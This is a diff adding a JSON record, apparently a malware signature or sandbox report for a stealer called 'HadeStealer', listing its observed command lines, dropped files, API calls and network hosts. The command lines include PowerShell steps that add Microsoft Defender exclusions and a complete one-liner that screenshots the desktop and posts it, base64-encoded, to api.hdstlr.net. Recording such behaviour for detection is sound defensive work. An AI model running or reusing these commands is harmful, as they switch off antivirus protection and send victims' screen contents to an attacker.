@@ -1,0 +1,27 @@
+{
+  "family": "HadeStealer",
+  "threadname": "HadeStealer/variant1",
+  "commandlines": [
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Program Files\\best' -Force\"",
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.exe' -Force\"",
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionExtension '.jsc' -Force\"",
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess 'best.exe' -Force\"",
+    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ErrorActionPreference = 'Stop'; try { Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0,0,0,0,$screen.Size); $bitmap.Save('C:\\Users\\Admin\\AppData\\Local\\Temp\\sys_win_*.png'); $graphics.Dispose(); $bitmap.Dispose(); $fileBytes = [System.IO.File]::ReadAllBytes('C:\\Users\\Admin\\AppData\\Local\\Temp\\sys_win_*.png'); $base64Image = [System.Convert]::ToBase64String($fileBytes); $headers = @{ 'X-Build-ID' = '*'; 'X-Api-KEY' = '*'; 'Content-Type' = 'application/json' }; $bodyObj = @{ image = $base64Image; buildId = '*' }; $jsonBody = $bodyObj | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://api.hdstlr.net/capture' -Method Post -Headers $headers -Body $jsonBody; } catch { Write-Error $_.Exception.Message; exit 1; }\""
+  ],
+  "writtenfiles": [
+    "C:\\Users\\Admin\\AppData\\Local\\Temp\\best.exe",
+    "C:\\Program Files\\best\\best.exe"
+  ],
+  "registry": [],
+  "apicalls": [
+    "Get-CimInstance",
+    "Get-ExecutionPolicy",
+    "Add-MpPreference",
+    "Invoke-RestMethod"
+  ],
+  "network": [
+    { "host": "api.hdstlr.net", "port": 0, "packagecontent": "" },
+    { "host": "minecraft.wiki", "port": 0, "packagecontent": "" },
+    { "host": "c.pki.goog", "port": 80, "packagecontent": "GET /r/r1.crl" }
+  ]
+}
